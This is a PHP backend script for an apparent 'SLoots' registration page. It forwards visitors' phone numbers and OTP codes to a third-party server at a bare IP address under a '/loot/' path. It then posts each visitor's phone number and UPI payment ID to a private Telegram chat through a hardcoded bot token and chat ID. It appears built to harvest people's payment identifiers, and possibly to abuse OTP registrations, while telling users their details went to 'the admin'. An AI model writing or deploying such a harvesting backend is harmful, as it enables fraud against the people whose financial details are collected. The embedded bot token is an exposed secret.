<?php
header('Access-Control-Allow-Origin: *'); // Allows our webpage to talk to this script
header('Content-Type: application/json');

// =======================================================
//          !!! CUSTOM CONFIGURATION !!!
// =======================================================
// Your personal Bot Token and Chat ID are now embedded.
$botToken = '8038263033:AAEhPlCJ1DOZ4LFTFJJXT59PKg3xDnJ6w3Q';
$chatId = '6575825147';
// =======================================================


$response = [];
$action = $_POST['action'] ?? '';

// Reusable function to talk to Lucifer server
function makeRequest($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_FOLLOWLOCATION => true,
    ]);
    $html = curl_exec($ch);
    curl_close($ch);
    return $html;
}

// Function to send a message to your Telegram
function sendMessageToTelegram($message) {
    global $botToken, $chatId;
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $telegramApiUrl,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

$baseUrl = 'http://13.234.36.150/loot/';

switch ($action) {
    case 'request_otp':
        $phone = $_POST['phone'] ?? '';
        if (empty($phone)) {
            $response = ['status' => 'error', 'message' => 'Phone number is required.'];
            break;
        }
        $url = $baseUrl . '?rno=' . urlencode($phone) . '&submit=submit';
        $html = makeRequest($url);
        if (strpos($html, 'OTP SEND SUCCESSFUL') !== false) {
            $response = ['status' => 'success', 'message' => 'OTP sent successfully!'];
        } else {
            $response = ['status' => 'error', 'message' => 'Failed to send OTP. Number might be already registered or invalid.'];
        }
        break;

    case 'verify_otp':
        $phone = $_POST['phone'] ?? '';
        $otp = $_POST['otp'] ?? '';
        if (empty($phone) || empty($otp)) {
            $response = ['status' => 'error', 'message' => 'Phone and OTP are required.'];
            break;
        }
        $url = $baseUrl . 'otp.php?phone=' . urlencode($phone) . '&otp=' . urlencode($otp) . '&submit=submit';
        $html = makeRequest($url);
        if (strpos($html, 'User Is Verified') !== false) {
            $response = ['status' => 'success', 'message' => 'OTP Verified! Please enter your UPI ID.'];
        } else {
            $response = ['status' => 'error', 'message' => 'OTP is incorrect or expired.'];
        }
        break;

    case 'submit_upi':
        $phone = $_POST['phone'] ?? '';
        $upi = $_POST['upi'] ?? '';
        if (empty($phone) || empty($upi)) {
            $response = ['status' => 'error', 'message' => 'Phone and UPI ID are required.'];
            break;
        }
        
        // Construct the message for Telegram
        $message = "<b>✨ New SLoots Registration ✨</b>\n\n";
        $message .= "<b>Phone:</b> <code>" . htmlspecialchars($phone) . "</code>\n";
        $message .= "<b>UPI ID:</b> <code>" . htmlspecialchars($upi) . "</code>";
        
        sendMessageToTelegram($message);
        
        $response = ['status' => 'success', 'message' => 'Registration Complete! Your details have been sent to the admin.'];
        break;

    default:
        $response = ['status' => 'error', 'message' => 'Invalid action.'];
        break;
}

echo json_encode($response);
?>